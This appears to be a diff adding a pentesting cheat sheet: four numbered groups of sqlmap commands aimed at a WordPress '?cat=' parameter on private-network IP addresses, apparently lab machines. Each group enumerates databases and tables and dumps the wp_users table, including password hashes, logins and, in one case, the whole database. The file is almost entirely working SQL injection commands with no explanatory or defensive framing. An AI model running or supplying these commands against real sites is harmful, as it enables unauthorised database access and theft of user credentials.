@@ -1,0 +1,16 @@
+1
+    sqlmap -u "http://192.168.80.162/_PATH_/?cat=1" --dbms=MySQL --dbs
+    sqlmap -u "http://192.168.80.162/_PATH_/?cat=1" --dbms=MySQL -D wordpress --tables 
+    ./sqlmap.py -u "http://192.168.111.131/_PATH_/?cat=1" -D wordpress -T wp_users -C user_firstname,user_lastname,user_nickname,user_pass --dump
+2
+    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 --users --passwords
+    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 --current-db
+    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 -D wordpress --tables
+    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 -D wordpress -T wp_users --columns
+    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 -D wordpress -T wp_users -C user_pass,user_login,user_level --dump
+3
+    sqlmap -u http://192.168.56.101/_PATH_/?cat=1 --dbs
+    sqlmap -u http://192.168.56.101/_PATH_/?cat=1 -D wordpress -T wp_users --columns --dump
+4
+    sqlmap –u http://192.168.1.104/_PATH_/?cat=1 --dbs --batch
+    sqlmap –u http://192.168.1.104/_PATH_/?cat=1 -D wordpress --dump-all --batch
